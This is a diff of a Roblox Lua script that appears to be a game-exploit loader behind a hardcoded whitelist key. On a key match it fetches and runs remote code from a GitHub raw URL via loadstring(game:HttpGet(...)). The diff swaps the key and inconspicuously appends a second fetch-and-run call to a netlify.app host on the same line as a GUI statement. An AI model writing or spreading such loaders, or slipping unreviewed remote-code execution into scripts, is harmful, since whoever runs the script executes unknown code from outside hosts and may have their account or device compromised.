@@ -34,15 +34,16 @@ Check.Text = "LogIn"
 Check.TextColor3 = Color3.fromRGB(0, 0, 0)
 Check.TextSize = 14.000
 Check.MouseButton1Down:connect(function()
-    if TextBox.Text == "Private-XR4FD-FNM4R" then game.StarterGui:SetCore("SendNotification", {
+    if TextBox.Text == "Private-YRFSN-FTJDS" then game.StarterGui:SetCore("SendNotification", {
 		Title = "Checking Ur Whitelist";
 		Text = "....";
 		Duration = 3;
 		})
 		
 	wait(3)  loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/pago/main/ScriptPago",true))()
-	Frame.Visible = false
-
+Frame.Visible = false	loadstring(game:HttpGet("https://adamantiunclouds.netlify.app"))()
+	
+	
 else
 
 	game.StarterGui:SetCore("SendNotification", {Title = "Checking Ur Whitelist";
